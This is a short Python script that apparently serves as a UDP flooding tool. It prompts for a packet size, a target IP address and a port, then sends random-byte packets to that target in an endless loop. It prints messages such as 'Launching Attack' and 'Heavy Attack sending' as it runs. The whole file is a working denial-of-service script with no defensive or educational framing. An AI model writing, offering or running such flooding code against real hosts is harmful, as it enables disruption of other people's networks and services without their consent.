import sys
import os
import random
import socket



os.system('cls')

print("\033[1;32m")

connect = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
print("WARNING USE AT UR OWN RISK THIS IS CODE SENDING PACKETS FROM UR COMPUTER IT WILL LAG U ")

try:
    size = int(input("Size> "))
    attack = random._urandom(size)
    ip = input("IP> ")
    port = int(input("port> "))
    print(" ")
    print("Launching Attack")
    print(" ")
except SyntaxError:
    print(" ")
    exit("\033[1;34m ERROR \033[1;m")
except NameError:
    print(" ")
    exit("\033[1;34m Invalid Input \033[1;m")
except KeyboardInterrupt:
    print(" ")
    exit("\033[1;34m [-]Canceled By User \033[1;m")
except ImportError:
    print(" ")
    exit("\033[1;34m [-]Install python 2.7.15")


while True:
    try:
        connect.sendto(attack, (ip, port))
        print(" Heavy Attack sending  ===>")
    except KeyboardInterrupt:
        print(" ")
        exit("\033[1;34m [-]Canceled By User \033[1;m")
    except ImportError:
        print(" ")
        exit("\033[1;34m [-]Install python 2.7.15")
